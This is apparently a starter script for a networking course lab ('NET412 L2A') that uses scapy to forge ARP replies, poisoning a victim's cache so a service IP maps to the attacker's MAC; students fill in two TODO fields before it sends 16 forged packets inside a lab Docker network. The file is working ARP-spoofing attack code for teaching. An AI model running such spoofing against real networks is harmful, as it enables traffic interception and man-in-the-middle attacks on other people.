"""NET412 L2A starter. Edit only the two TODO values, then use Bounded ARP attempt."""
import sys
from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp

victim_ip = "10.77.12.10"
service_ip = "10.77.12.20"
iface = "eth0"
victim_mac = getmacbyip(victim_ip)
attacker_mac = get_if_hwaddr(iface)

# TODO: The ARP reply should claim to be from the service IP, at the attacker MAC.
forged_sender_ip = "REPLACE_WITH_SERVICE_IP"
forged_sender_mac = "REPLACE_WITH_ATTACKER_MAC"

if not victim_mac or forged_sender_ip != service_ip or forged_sender_mac != attacker_mac:
    raise SystemExit("Check the two sender fields in /work/poison_student.py")
if "--check" in sys.argv:
    print("Scaffold fields ready")
    raise SystemExit(0)

packet = Ether(src=attacker_mac, dst=victim_mac) / ARP(
    op=2, psrc=forged_sender_ip, pdst=victim_ip,
    hwsrc=forged_sender_mac, hwdst=victim_mac,
)
sendp(packet, iface=iface, count=16, inter=0.25, verbose=False)
print("Sent 16 bounded forged replies inside the NET412 Docker network")
